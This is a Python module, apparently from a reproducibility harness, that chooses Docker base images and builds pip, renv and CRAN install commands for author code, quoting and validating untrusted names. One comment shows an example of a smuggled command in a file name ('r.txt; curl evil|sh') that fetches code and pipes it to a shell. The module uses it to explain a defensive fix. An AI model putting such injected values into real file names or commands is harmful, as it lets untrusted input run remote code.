"""Environment planning.

Decision rule (see docs/DESIGN.md §3):

    author manifest pins an image        -> use it as-is        [author-image]
    repo needs only the known sci stack  -> reprobe-base-* + overlay   [pinned-base]  (default)
    --allow-repo2docker and repo complex -> repo2docker build   [repo2docker]
    otherwise                            -> pinned-base best-effort + warn

For the MVP the pinned-base path is implemented; repo2docker is a documented
Phase-2 hook. The report always records ``env_provenance`` so a reviewer knows
whether the environment was author-specified or harness-default.
"""

from __future__ import annotations

import shlex
from pathlib import Path
from typing import Any

from ..config import Config
from ..docker_exec import docker_available, image_present
from ..models import DetectResult, EnvPlan


def _needs(kinds: set[str], *want: str) -> bool:
    return any(k in kinds for k in want)


# Same invocation for manifest-declared and auto-detected lockfiles: guarded so
# an image without renv fails loudly (non-zero -> install noted failed/skipped)
# instead of a cryptic traceback or a silent "ok".
_RENV_RESTORE = ("Rscript -e 'if (requireNamespace(\"renv\", quietly=TRUE)) renv::restore(prompt=FALSE) "
                 "else { message(\"renv not preinstalled in image; renv.lock NOT restored\"); quit(status=3) }'")


def _cran_packages(env: dict[str, Any], detected: list[str]) -> list[str]:
    """Union of author-declared (manifest environment.r_packages) and statically
    detected R packages, validated to a safe charset and stripped of base/
    recommended packages that ship with every R."""
    from ..detect.signatures import _R_BASE_PKGS, _R_PKG_NAME_RE
    declared = env.get("r_packages") or []
    names = {str(p).strip() for p in list(declared) + list(detected or [])}
    return sorted(n for n in names if n and _R_PKG_NAME_RE.match(n) and n not in _R_BASE_PKGS)


def _cran_install_command(packages: list[str], cran_repo: str) -> str:
    """An `Rscript -e '...'` that installs only the packages that are (a) not
    already present in the image/library AND (b) available on the pinned CRAN
    snapshot, into R_LIBS_USER; anything not on CRAN is reported, never faked.

    Package names are pre-validated to ``[A-Za-z][A-Za-z0-9.]*`` (no quote/space/
    shell metacharacter), so embedding them in the double-quoted R vector inside
    the single-quoted `-e` argument cannot inject shell or R code."""
    repo = cran_repo or "https://cloud.r-project.org"
    vec = ", ".join(f'"{p}"' for p in packages)
    r_code = (
        "pkgs <- c(" + vec + "); "
        'repo <- "' + repo + '"; '
        "have <- rownames(installed.packages()); "
        "need <- setdiff(pkgs, have); "
        "if (length(need)) { "
        "avail <- tryCatch(rownames(available.packages(repos=repo)), error=function(e) character(0)); "
        "ok <- intersect(need, avail); "
        "miss <- setdiff(need, avail); "
        'if (length(ok)) install.packages(ok, repos=repo, lib=Sys.getenv("R_LIBS_USER")); '
        'if (length(miss)) message("reprobe: R packages not on CRAN (not installed): ", '
        'paste(miss, collapse=", ")); '
        # A CRAN-available package that is still missing afterwards FAILED to
        # build — surface it as a non-zero exit so the install phase is reported
        # failed (never silently "ok") and the run's step failures are read as
        # environmental.
        "failed <- setdiff(ok, rownames(installed.packages())); "
        'if (length(failed)) { message("reprobe: CRAN packages FAILED to install: ", '
        'paste(failed, collapse=", ")); quit(status=1) } '
        "}"
    )
    return "Rscript -e '" + r_code + "'"


def plan(
    detect_result: DetectResult,
    manifest_meta: dict[str, Any],
    config: Config,
    src_dir: str | Path,
    *,
    allow_repo2docker: bool = False,
) -> EnvPlan:
    src = Path(src_dir)
    env = (manifest_meta or {}).get("environment", {}) or {}
    kinds = set(detect_result.artifact_types)
    builder = str(env.get("builder") or "")

    # 1) author pinned an image
    if env.get("image"):
        return EnvPlan(strategy="author-image", image=str(env["image"]),
                       env_provenance="author-specified")

    # choose default base image: python stack unless purely R
    py_needed = _needs(kinds, "python", "jupyter")
    r_needed = _needs(kinds, "r", "rmarkdown")
    image_key = "python" if py_needed or not r_needed else "r"
    image = config.base_image(image_key) or config.pins.get("fetch", {}).get("fallback_python_image", "")

    install, dep_warnings = _install_commands(
        env, src, r_needed,
        detected_r_packages=detect_result.r_packages,
        cran_repo=config.cran_repo)

    flags = detect_result.flags
    if ("needs-repo2docker" in flags or builder == "repo2docker") and allow_repo2docker:
        # Phase 2: hand off to repo2docker_builder. For now, record intent.
        return EnvPlan(strategy="repo2docker", image=image, env_provenance="repo2docker-built",
                       install_commands=install, repo2docker_version=config.pins.get("tools", {}).get("repo2docker"),
                       warnings=["repo2docker builder is a Phase-2 hook; using pinned base best-effort"]
                                + dep_warnings)

    strategy = "pinned-base"
    warnings = []
    if builder == "repo2docker":
        strategy = "besteffort"
        warnings.append("author requested builder: repo2docker; not built in this run — "
                        "re-run with --allow-repo2docker")
    elif builder == "author-image":
        warnings.append("author requested builder: author-image but pinned no image; using pinned base")
    elif builder not in ("", "pinned-base"):
        warnings.append(f"unknown builder '{builder}' in manifest; using pinned base")
    if "needs-repo2docker" in flags:
        strategy = "besteffort"
        warnings.append("repo declares system-level setup (Dockerfile/postBuild/apt.txt); "
                        "pinned base may lack some deps. Re-run with --allow-repo2docker for fidelity.")

    # Pinned base declared but not present locally: fall back to the generic
    # image (python stacks only — there is no generic R fallback) rather than
    # letting every step fail with an image-missing infra error.
    provenance = "harness-default"
    if image and docker_available() and not image_present(image):
        fallback = config.fetch_cfg.get("fallback_python_image", "")
        if image_key == "python" and fallback:
            warnings.append(f"pinned base image '{image}' is not present locally; using generic "
                            f"fallback '{fallback}' (best-effort — build the real base with "
                            "images/build-images.sh)")
            image, provenance = fallback, "fallback-generic"
        else:
            warnings.append(f"pinned base image '{image}' is not present locally and no fallback "
                            "applies — steps will report an infra error, not an artifact failure")

    return EnvPlan(strategy=strategy, image=image, env_provenance=provenance,
                   install_commands=install, warnings=warnings + dep_warnings)


def _install_commands(env: dict[str, Any], src: Path, r_needed: bool,
                      detected_r_packages: list[str] | tuple[str, ...] = (),
                      cran_repo: str = "") -> tuple[list[str], list[str]]:
    """Returns (commands, warnings). Any declared or detected dependency file
    the pinned-base builder does NOT install must surface as a warning — the
    report says what was not installed (never over-claim)."""
    cmds: list[str] = []
    warnings: list[str] = []
    dep = str(env.get("dependencies") or "")
    # explicit manifest dependency file
    if dep and not (src / dep).exists():
        warnings.append(f"manifest declares dependencies '{dep}' but the file does not exist; "
                        "auto-detecting instead")
    elif dep.endswith(".txt"):
        # dep is an untrusted manifest-declared filename later run via `bash -c`;
        # shell-quote it (POSIX, for the Linux install container) so a name like
        # `r.txt; curl evil|sh` cannot inject a command into the install phase.
        cmds.append(f"pip install --no-input --target=/work/.reprobe_deps -r {shlex.quote(dep)}")
    elif dep.endswith("renv.lock"):
        cmds.append(_RENV_RESTORE)
    elif dep.endswith((".yml", ".yaml")):
        warnings.append(f"conda file '{dep}' is not installed by the pinned-base builder; its packages were "
                        "NOT installed — re-run with --allow-repo2docker for a faithful environment")
    elif dep:
        warnings.append(f"declared dependency file '{dep}' is not a supported type "
                        "(requirements.txt | environment.yml | renv.lock); it was NOT installed")
    if not cmds:
        # auto-detect common manifests (repo2docker-style conventions)
        if (src / "requirements.txt").is_file():
            cmds.append("pip install --no-input --target=/work/.reprobe_deps -r requirements.txt")
        if (src / "renv.lock").is_file():
            if r_needed:
                cmds.append(_RENV_RESTORE)
            else:
                warnings.append("renv.lock present but no R steps detected; R dependencies were NOT restored")
        elif (src / "install.R").is_file():
            if r_needed:
                cmds.append("Rscript install.R")
            else:
                warnings.append("install.R present but no R steps detected; it was NOT run")
        if not dep.endswith((".yml", ".yaml")):
            for cand in ("environment.yml", "environment.yaml", "binder/environment.yml"):
                if (src / cand).is_file():
                    warnings.append(f"conda file '{cand}' is not installed by the pinned-base builder; its packages "
                                    "were NOT installed — re-run with --allow-repo2docker for a faithful environment")
                    break
    # CRAN packages the base image lacks: author-declared (manifest r_packages)
    # + statically detected library()/require()/pkg:: usages. The install itself
    # picks only the CRAN-available, not-already-present subset (see
    # _cran_install_command) and runs in the sanctioned egress phase; the author
    # analysis still runs offline.
    cran_pkgs = _cran_packages(env, list(detected_r_packages))
    if cran_pkgs:
        if r_needed:
            cmds.append(_cran_install_command(cran_pkgs, cran_repo))
            if not cran_repo:
                warnings.append("no r.cran_snapshot pinned in pins.yaml; detected R packages install "
                                "from a live CRAN mirror (versions not reproducible across time)")
        else:
            warnings.append(f"R packages {cran_pkgs} were declared/detected but no R steps were found; "
                            "they were NOT installed")

    # record resolved versions in the install log so two runs are comparable
    if any(c.startswith("pip install") for c in cmds):
        cmds.append("pip freeze --path=/work/.reprobe_deps")
    if any(c.startswith("Rscript") for c in cmds):
        cmds.append("Rscript -e 'print(installed.packages()[, c(\"Package\", \"Version\")])'")
    return cmds, warnings
